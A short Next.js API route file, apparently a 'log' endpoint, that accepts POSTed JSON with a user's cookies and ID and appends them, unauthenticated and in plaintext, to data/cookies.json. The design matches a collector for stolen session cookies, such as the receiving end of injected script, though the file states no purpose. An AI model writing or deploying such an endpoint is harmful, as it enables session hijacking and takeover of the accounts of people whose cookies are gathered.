// app/api/log/route.ts
import fs from 'fs';
import path from 'path';
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  const body = await request.json();
  const { cookies, userId, timestamp } = body;

  const logEntry = {
    id: Date.now(),
    userId: userId ?? 'unknown',
    cookies: cookies ?? '',
    timestamp: new Date().toISOString(),
  };

  const dataDir = path.join(process.cwd(), 'data');
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);

  const filePath = path.join(dataDir, 'cookies.json');
  fs.appendFileSync(filePath, JSON.stringify(logEntry) + '\n');

  return NextResponse.json({ success: true });
}